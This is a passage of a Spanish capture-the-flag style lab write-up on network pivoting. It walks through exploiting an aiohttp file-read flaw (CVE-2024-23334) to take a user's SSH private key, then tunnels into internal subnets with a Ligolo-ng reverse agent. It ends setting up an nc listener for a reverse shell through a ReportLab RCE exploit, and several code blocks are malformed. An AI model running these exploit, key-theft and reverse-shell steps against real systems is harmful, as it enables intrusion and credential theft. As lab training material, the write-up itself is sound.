<img width="882" height="443" alt="image" src="https://github.com/user-attachments/assets/6a9c36f2-2543-4c88-88c4-8b6b4085cd01" />

# 🧠 Laboratorio de Pivoting y Movimiento Lateral

## 🏗️ Arquitectura de Red y Diseño del Escenario

Para dar inicio a este laboratorio, es fundamental comprender la topología de red diseñada. A diferencia de entornos de explotación lineal o de baja dificultad, este escenario presenta una arquitectura segmentada compuesta por **cuatro máquinas interconectadas**, distribuidas a través de **cuatro subredes lógicas distintas**.

![Arquitectura de Red](https://github.com/user-attachments/assets/fcb5e26c-7280-42b5-9099-5256ff562224)

---

## 🔀 Segmentación y Conectividad (Dual-Homed)

La característica crítica de esta infraestructura es que cada nodo intermedio está configurado como una máquina **dual-homed**.

Esto implica que cada activo posee al menos **dos interfaces de red** (físicas o virtuales) activas, permitiéndole:

- Coexistir en múltiples segmentos de red simultáneamente  
- Actuar como puente entre subredes  
- Facilitar el movimiento lateral  

💡 Esta configuración es el pilar del laboratorio, ya que estas máquinas funcionan como **gateways naturales** entre zonas que normalmente estarían completamente aisladas.

---

## 🗺️ Referencia Visual de la Infraestructura

Para facilitar el seguimiento de la intrusión y mantener una trazabilidad clara del progreso, se ha definido un esquema donde se detallan:

- Direccionamientos IP  
- Nombres de host  
- Relación entre segmentos de red  

Este esquema servirá como **hoja de ruta** a lo largo de toda la guía.

---

## 🎯 Objetivos Estratégicos y Metodología

El propósito central de este laboratorio es el perfeccionamiento de técnicas de **Pivoting**.

El ejercicio demanda que el operador sea capaz de:

- Tunelizar tráfico desde una red externa  
- Acceder a segmentos internos progresivamente  
- Utilizar cada máquina comprometida como un **jump server**  

---

## 🔄 Flujo del Compromiso

El éxito del ejercicio se define por la capacidad de comprometer todos los activos de forma escalonada:


RED 1 → RED 2 → RED 3 → RED 4


Cada sistema comprometido permite:

- Expandir el acceso dentro de la red  
- Establecer nuevos túneles  
- Alcanzar segmentos previamente inaccesibles  

---

## 🔐 Nota sobre la Escalada de Privilegios

Durante la fase de post-explotación en cada nodo, se realizaron auditorías exhaustivas mediante:

- Scripts de enumeración automatizada  
- Búsqueda de capabilities  
- Identificación de binarios SUID  
- Análisis de vulnerabilidades del kernel  

### 📌 Resultados

- ❌ No se identificaron vectores de escalada de privilegios críticos o intencionados  
- 🎯 El entorno está enfocado en el **movimiento lateral**  

---

## 🧩 Diseño del Reto

El laboratorio está optimizado específicamente para la práctica de:

- Pivoting  
- Enrutamiento interno  
- Gestión de túneles y proxies  

### 🔧 Herramientas recomendadas

- Chisel  
- Ligolo-ng  
- Metasploit (autoroute)  

---

## ✍️ Nota de Edición

Con el fin de mantener la guía concisa y enfocada en el aprendizaje del pivoting:

> Se han omitido los procesos de enumeración negativa relacionados con la escalada de privilegios.

Tras obtener acceso inicial en cada máquina, se procede directamente al:

- Establecimiento de túneles  
- Movimiento lateral hacia el siguiente objetivo  


# Reconocimiento inicial (máquina “Hospital”, 10.10.10.2)

Se inicia el reconocimiento mediante un ping a la máquina. Esto se hace por un lado para detectar que la máquina se encuentra accesible y por otro lado para poder detectar el sistema operativo mediante el TTL asignado.

```
ping -c 1 10.10.10.2
```

<img width="542" height="140" alt="image" src="https://github.com/user-attachments/assets/cef1e452-c001-44f3-9c47-70597eebf88b" />

Se puede comprobar que el TTL asignado es 64, indicando que la máquina está accesible directamente sin ningún nodo intermediario y por otro lado que el sistema subyacente es GNU/Linux.

Una vez hecho esto, se realiza un reconocimiento de los servicios disponibles en dos fases. En la primera, se realiza un escaneo de todos los puertos TCP usando nmap para detectar en primera instancia cuales de ellos son accesibles (open), utilizando un escaneo TCP SYN.

```ruby
sudo nmap -sS -p- --min-rate 1000 -n -Pn 10.10.10.2 -oN allPorts
```
<img width="520" height="280" alt="image" src="https://github.com/user-attachments/assets/beb731d2-1508-49f1-af4b-d1b5651a5092" />

En la segunda, se realiza un reconocimiento básico de los servicios subyacentes también mediante el uso de nmap. Esta vez, realizando dicha tarea de reconocimiento únicamente en los puertos detectados como abiertos.

```ruby
nmap -sCV -p 22,80,5000 -n -Pn 10.10.10.2 -oN services
```

<img width="826" height="341" alt="image" src="https://github.com/user-attachments/assets/42bff05a-f0cc-4e6d-b7ee-9c281ff39d4e" />

En este caso, se omite el escaneo de puertos UDP, ya que para esta máquina en particular no tiene ningún servicio relevante para llevar a cabo el ejercicio.

## 🚪 Acceso Inicial — drzunder (Máquina "Hospital" | 10.10.10.2)

### 🔍 Enumeración de Servicios

Durante la fase de reconocimiento inicial, se identificaron los siguientes puertos abiertos en el objetivo:

- **22/tcp** → Servicio SSH (*OpenSSH*)  
- **80/tcp** → Servicio HTTP (*Apache*)  
- **5000/tcp** → Servicio HTTP (*aiohttp 3.9.1*)  

Adicionalmente, mediante fingerprinting de servicios, se determinó que el sistema operativo subyacente es **Ubuntu**.

---

### ⚠️ Identificación de Vulnerabilidad

Tras analizar los servicios expuestos, se detectó que la aplicación web ejecutándose en el puerto **5000** es vulnerable a una **lectura arbitraria de archivos (LFI)**, correspondiente a la siguiente vulnerabilidad:

- **CVE-2024-23334**

Esta vulnerabilidad permite a un atacante acceder a archivos locales del sistema sin necesidad de autenticación, lo que resulta crítico en escenarios de post-explotación y recolección de credenciales.

---

### 🧨 Explotación

Se identificó un **Proof of Concept (PoC)** funcional disponible públicamente, el cual permite explotar la vulnerabilidad de forma directa:

- 🔗 CVE: https://nvd.nist.gov/vuln/detail/CVE-2024-23334  
- 🔗 Exploit: https://github.com/s4botai/CVE-2024-23334-PoC  

Una vez descargado el exploit, se procedió a su ejecución para validar la vulnerabilidad mediante la lectura del archivo `/etc/passwd`.

### 🧨 Exfiltración de la clave privada

```bash
wget https://raw.githubusercontent.com/s4botai/CVE-2024-23334-PoC/refs/heads/main/lfi.sh
chmod +x lfi.sh
./lfi.sh -u http://10.10.10.2:5000/static/index.html -f /etc/passwdS
``` id="exploit-lfi"
````

<img width="964" height="507" alt="image" src="https://github.com/user-attachments/assets/b8bbcbd4-ba1b-415f-9feb-67f3f9c4ace6" />


La explotación fue exitosa, permitiendo la lectura de archivos locales del sistema objetivo. Esto confirma:

- La existencia de la vulnerabilidad LFI  
- La capacidad de acceder a información sensible  
- Un punto de apoyo inicial para continuar con la intrusión  

Este vector será clave para la obtención de credenciales y el posterior acceso al sistema a través de otros servicios como SSH.


### 🛠️ Preparación de la clave

Una vez obtenida, se guarda localmente y se ajustan los permisos requeridos por SSH:

```bash
nano drzunder-id_rsa
chmod 600 drzunder-id_rsa
``` id="prep-ssh"
```
### 🚪 Acceso remoto vía SSH

Se establece conexión con el sistema objetivo utilizando autenticación por clave:

```bash
ssh -i drzunder-id_rsa drzunder@10.10.10.2
```
Una vez dentro, se verifica el contexto de ejecución:

![Acceso SSH exitoso](https://github.com/user-attachments/assets/b6f1ac35-d7d2-4243-b1b5-dba87a78720f)


### 📌 Conclusión

La explotación de la vulnerabilidad permitió:

- Acceder a archivos sensibles del sistema  
- Exfiltrar la clave privada del usuario  
- Autenticarse vía SSH sin credenciales tradicionales  
- Obtener acceso interactivo al sistema  

Este punto representa un **acceso inicial completo**, habilitando fases posteriores como enumeración interna y técnicas de pivoting.

## 🔀 Pivoting 1 (10.10.10.0/24 → 20.20.20.0/24)

### 🧭 Identificación de doble interfaz (Dual-Homed)

En esta fase se detecta que la máquina comprometida **"Hospital"** pertenece a **dos segmentos de red distintos**, lo que la convierte en un candidato ideal para realizar pivoting.

La validación se realiza mediante la inspección del archivo `/etc/hosts`, donde se observa que el hostname está asociado a múltiples direcciones IP:

```bash
cat /etc/hosts
```
![Interfaces de red](https://github.com/user-attachments/assets/779ba088-88f5-42e1-a769-647dc194c184)

Este comportamiento confirma que el sistema actúa como un nodo **dual-homed**, es decir, con conectividad simultánea a:

- `10.10.10.0/24` (red inicial comprometida)  
- `20.20.20.0/24` (red interna no accesible directamente)  

---

### 🎯 Objetivo del Pivoting

Dado que ya se ha comprometido esta máquina, puede utilizarse como **primer pivote** para:

- Enumerar la red interna (`20.20.20.0/24`)  
- Descubrir nuevos activos  
- Establecer rutas de acceso hacia sistemas inaccesibles desde el exterior  

Este paso marca el inicio del **movimiento lateral real dentro del laboratorio**.

---

## ⚙️ Herramienta utilizada: Ligolo-ng

Para esta fase se utiliza **Ligolo-ng**, una herramienta moderna y eficiente para tunneling y pivoting.

🔗 Repositorio: https://github.com/Nicocha30/ligolo-ng  
🔗 Releases: https://github.com/nicocha30/ligolo-ng/releases/tag/v0.8.2  

---

### 🚀 Características clave

- Uso de interfaz **TUN** para redirección de tráfico  
- Soporte de **tráfico IP completo** (no solo puertos)  
- Compatible con herramientas nativas como:
  - `nmap`
  - `netexec`
  - `curl`, etc.  
- No requiere privilegios elevados en el host pivote  
- Conexión reversa mediante **TLS** (evasión de restricciones)  
- Simula acceso como si se estuviera dentro de la red interna  

💡 Esto permite trabajar de forma transparente, sin necesidad de configuraciones complejas adicionales.

---

## 🧩 Arquitectura de Ligolo-ng

Ligolo-ng se compone de dos elementos principales:

### 🖥️ Proxy (Atacante)

Se ejecuta en la máquina del operador y actúa como:

- Centro de control de túneles  
- Receptor de conexiones de agentes  
- Gestor de sesiones y rutas  

Permite:

- Listar sesiones activas  
- Configurar túneles  
- Redirigir tráfico  

---

### 🛰️ Agente (Víctima / Pivote)

Se ejecuta en la máquina comprometida (**Hospital**) y:

- Establece conexión reversa TLS hacia el proxy  
- Expone su red interna  
- Permite pivotar hacia otros segmentos  

---

## ▶️ Inicialización del Proxy

Una vez descargados los binarios correspondientes, se inicia el **proxy** en la máquina atacante.

> ⚠️ Se recomienda ejecutar este proceso en una terminal separada y mantenerla activa durante toda la operación.

```ruby
sudo ./proxy -selfcert
NFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
INFO[0000] Listening on 0.0.0.0:11601                   
INFO[0000] Starting Ligolo-ng Web, API URL is set to: http://127.0.0.1:8080 
WARN[0000] Ligolo-ng API is experimental, and should be running behind a reverse-proxy if publicly exposed. 
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /                                                                                               
        /____/                          /____/                                                                                                
                                                                                                                                              
  Made in France ♥            by @Nicocha30!                                                                                                  
  Version: 0.8.3                                                                          

- El proxy quedará a la escucha en el puerto **11601** por defecto  
- Se utiliza un certificado autofirmado para la conexión TLS  
```

A## 🔗 Despliegue del Agente y Establecimiento del Túnel

Una vez inicializado el **proxy**, el siguiente paso consiste en conectar la máquina comprometida (**Hospital**) mediante el agente de Ligolo-ng.

Para ello, es necesario transferir el binario del agente al sistema objetivo, asignarle permisos de ejecución y establecer una conexión reversa hacia el proxy.

---

### 📦 Transferencia del agente

Desde la máquina atacante, se levanta un servidor HTTP temporal para facilitar la transferencia del binario:

```bash
python3 -m http.server 80
``` id="http-server"
```
---

### 📥 Descarga y preparación en la máquina pivote

En la máquina comprometida:

```bash
cd /tmp
wget http://10.10.10.1/agent
ls -al agent
chmod +x agent
``` id="agent-setup"
```

### 🚀 Ejecución del agente

Se ejecuta el agente indicando la dirección del proxy y deshabilitando la verificación del certificado:

```bash
./agent -connect 10.10.10.1:11601 -ignore-cert
``` id="agent-run"
```
![Ejecución del agente]<img width="1127" height="29" alt="image" src="https://github.com/user-attachments/assets/9d90e7ea-dbcd-4b71-b1d3-79541c0f2160" />




### 📡 Verificación de la conexión

Tras la ejecución, el agente establece una conexión reversa hacia el proxy. Desde la consola del proxy, se puede confirmar que la sesión ha sido registrada correctamente:

```bash
ligolo-ng » INFO[...] Agent joined. id=02420a0a0a02 name=drzunder@489a833a8b7e remote="10.10.10.2:53694"
``` id="agent-check"
```
<img width="1127" height="29" alt="image" src="https://github.com/user-attachments/assets/10e90139-3317-4a3c-8acf-c4da2dc41c88" />


### 📌 Resultado

En este punto:

- ✅ El agente se encuentra activo en la máquina pivote  
- ✅ El proxy ha registrado la sesión correctamente  
- ✅ Se ha establecido un canal de comunicación seguro (TLS)  

---

### 🧠 Conclusión

La conexión del agente marca un punto clave en el proceso de pivoting:

- Se habilita el acceso a la red interna desde la máquina atacante  
- Se establece la base para el enrutamiento de tráfico  
- Se permite interactuar con la red `20.20.20.0/24` como si se estuviera dentro de ella  

El siguiente paso consistirá en configurar la interfaz TUN y comenzar la enumeración de la red interna.

(en el proxy)
session (seleccionar la 1, la única que hay)
```
ifconfig
```
<img width="674" height="499" alt="image" src="https://github.com/user-attachments/assets/70de067b-7386-4dcf-adba-7e0bc93ec3bb" />

Una vez conocida la dirección CIDR de la nueva red, es necesario crear una nueva interfaz TUN en la máquina de trabajo para poder redirigir el tráfico de red a esta.
````
sudo ip tuntap add user root mode tun ligolo (crear la interfaz TUN llamada "ligolo")
sudo ip link set ligolo up (levanta la interfaz de red creada)
ip link show ligolo (comprobar el estado de la interfaz)
````
<img width="419" height="51" alt="image" src="https://github.com/user-attachments/assets/d83b0ecc-1607-4692-8ccc-c3ddf38b07ad" />

El siguiente paso consiste en actualizar la tabla de enrutamiento para que el tráfico de la nueva red se enrute a través de la interfaz “ligolo”.

sudo ip route add 20.20.20.0/24 dev ligolo (asociar la dirección CIDR de la nueva red a la interfaz "ligolo" en la tabla de enrutamiento)
ip route list (listar la tabla de enrutamiento actualizada)

Una vez hecho esto, desde el proxy se da la instrucción para, usando la sesión activa, iniciar el túnel de red a través de la interfaz “ligolo”. Esto se hace para permitir enrutar tráfico hacia la red del agente.

```
(en el proxy, con la sesión previamente seleccionada)
start
```
<img width="528" height="36" alt="image" src="https://github.com/user-attachments/assets/dc85f659-12e9-4556-922f-9328fbe82263" />

Al realizar esta operación, quedaría comprobar si la siguiente máquina perteneciente a la nueva red es accesible. Para ello, se realiza un ping y se comprueba su TTL, tal y como se ha hecho con la anterior.
```
ping 20.20.20.3 -c 1
```
<img width="492" height="137" alt="image" src="https://github.com/user-attachments/assets/b0b1a0e9-3e16-4536-8042-43a84e41f4fc" />

Se puede comprobar que el TTL asignado es 64, indicando que la máquina está accesible directamente sin ningún nodo intermediario y por otro lado que el sistema subyacente es GNU/Linux. Por lo que, es posible continuar de forma normal con el siguiente reconocimiento inicial.


## 🔍 Reconocimiento inicial — Máquina "Patient" (20.20.20.3)

Una vez establecido el pivoting hacia la red interna (`20.20.20.0/24`), se procede al reconocimiento del nuevo objetivo: **Patient (20.20.20.3)**.

El análisis se realiza en dos fases: descubrimiento de puertos y enumeración de servicios.

---

### 📡 Fase 1: Escaneo de puertos (TCP Connect)

En primer lugar, se realiza un escaneo completo de puertos TCP para identificar servicios accesibles:

```bash
sudo nmap -sT -p- -n -Pn 20.20.20.3
``` id="tcp-connect-scan"
```
![Escaneo de puertos](https://github.com/user-attachments/assets/1eff2f3f-c13d-4dce-b5c2-8ef0dc2b93aa)

### ⚙️ Justificación del uso de TCP Connect

En este escenario se utiliza el modo **TCP Connect (`-sT`)** en lugar del escaneo SYN (`-sS`) debido a las limitaciones impuestas por el entorno de pivoting con **Ligolo-ng**.

El escaneo SYN requiere acceso a **raw sockets**, lo cual no está disponible cuando el tráfico está encapsulado dentro de un túnel TCP.

Por el contrario, el método TCP Connect:

- Establece una conexión TCP completa mediante `connect()`  
- No requiere raw sockets  
- Es compatible con entornos tunelizados  
- Ofrece mayor fiabilidad en este contexto  

💡 Aunque es menos sigiloso y más lento que SYN scan, resulta más adecuado en escenarios donde el tráfico está encapsulado.

### 🔎 Fase 2: Enumeración de servicios

Una vez identificados los puertos abiertos, se procede a la enumeración detallada de servicios y versiones:

```bash
nmap -sCV -p 2222,9000 -n -Pn 20.20.20.3 -oN services-20.20.20.3
``` id="service-scan"
```
Este escaneo permite:

- Identificar versiones de servicios  
- Ejecutar scripts básicos de detección (`-sC`)  
- Obtener información relevante para futuras fases de explotación  

---

### 🚫 Consideraciones sobre UDP

En este caso, no se realiza escaneo de puertos UDP debido a que:

- No se han identificado servicios relevantes expuestos en UDP  
- El alcance del laboratorio se centra en servicios TCP  
- UDP suele requerir tiempos de escaneo mayores sin impacto significativo en este contexto  

---

### 📌 Conclusión

El reconocimiento inicial sobre la máquina **Patient** revela:

- Puertos TCP abiertos en `2222` y `9000`  
- Servicios activos que serán analizados en fases posteriores  
- Un punto de entrada potencial dentro de la red interna  

Este análisis sienta las bases para la siguiente fase: **enumeración profunda y posible explotación de servicios**.


# Acceso inicial (app, máquina “Patient”, 20.20.20.3)

En este caso se detecta que hay dos puertos abiertos:

    Puerto 2222 (servicio SSH, OpenSSH)
    Puerto 9000 (servicio HTTP, Werkzeug/Python)

Además, gracias a la detección del servicio, se detecta que el sistema subyacente es Ubuntu.

Tras investigar el servicio 9000 disponible en esta máquina, se puede comprobar que muestra un formulario para subir archivos.
```
URL -> http://20.20.20.3:9000
```

<img width="685" height="467" alt="image" src="https://github.com/user-attachments/assets/d2e04787-36e2-45ee-9697-e3bf8d35631b" />

Al comprobar el código fuente, resulta que el tipo de archivo que acepta esta funcionalidad es “.html”.
```
CTRL+U (abrir código fuente de la página)
URL -> view-source:http://20.20.20.3:9000/
```
<img width="566" height="796" alt="image" src="https://github.com/user-attachments/assets/dfb318e9-2b58-4f0d-91bc-6aea55f5a2a1" />

Por lo que se sube un archivo de prueba para ver en qué consiste la funcionalidad presentada. Primero, se crea un archivo HTML muy simple.

# prueba.html

<strong>hola</strong>

Una vez subido este archivo, descarga automáticamente una versión del mismo en PDF.
<img width="860" height="463" alt="image" src="https://github.com/user-attachments/assets/5696625d-12e8-4939-b58e-8b93f1c84f40" />
Al comprobar los metadatos de este archivo, en este se encuentra el nombre de la librería encargada de realizar esta transformación: ReportLab PDF Library.

exiftool ~/Downloads/document.pdf
...
Producer       : ReportLab PDF Library - www.reportlab.com
...

<img width="664" height="377" alt="image" src="https://github.com/user-attachments/assets/8bf4f298-b524-4ebe-881b-44afe4fe4608" />


No incluye la versión del programa en este caso, pero tras investigar un poco, se descubre que este programa presenta una vulnerabilidad de ejecución remota de código (CVE-2023–33733).

Se ha encontrado también un exploit en GitHub asociado a esta vulnerabilidad que se puede usar para obtener acceso al sistema.

Referencia a CVE: https://nvd.nist.gov/vuln/detail/CVE-2023-33733
Exploit utilizado: https://github.com/c53elyas/CVE-2023-33733

Antes de poder ejecutar el exploit para establecer una consola inversa (reverse shell), es necesario realizar unas configuraciones en el proxy de Ligolo-NG para poder tener acceso a ciertos recursos. Por ello, se van a realizar las siguientes configuraciones en el proxy:

    Redirección del puerto 1337 para poder establecer una consola inversa el ejecutar el exploit a través del túnel establecido.
    Recirección del puerto 8008 reservado para futuras transferencias de ficheros a través del túnel establecido.
```
(en el proxy, desde la sesión activa correspondiente)
listener_add --addr 0.0.0.0:1337 --to 127.0.0.1:1337 --tcp (proxy puerto 1337 <-> agente puerto 1337)
listener_add --addr 0.0.0.0:8008 --to 127.0.0.1:8008 --tcp (proxy puerto 8008 <-> agente puerto 8008)
listener_list (comprobar redirecciones realizadas)
```
<img width="736" height="143" alt="image" src="https://github.com/user-attachments/assets/435a514f-cc4f-48a1-a22c-afa270ac9f06" />


En este punto, se establece el puerto 1337 a la escucha, ya que es el puerto que se ha reservado desde el agente para establecer una consola inversa, de tal forma que lo que reciba el agente, será redirigido a este puerto a la escucha en la máquina de trabajo.

rlwrap nc -nvlp 1337
